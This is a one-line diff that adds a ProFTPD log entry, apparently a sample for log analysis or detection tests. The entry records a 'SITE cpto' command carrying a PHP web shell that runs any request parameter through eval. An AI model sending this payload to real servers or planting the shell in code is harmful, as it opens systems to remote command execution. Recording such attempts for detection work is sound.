@@ -1,0 +1,1 @@
+proftpd: 89.190.92.156:53019: SITE cpto /tmp/.<?php eval($_REQUEST[cmd]); echo GOOD;?>
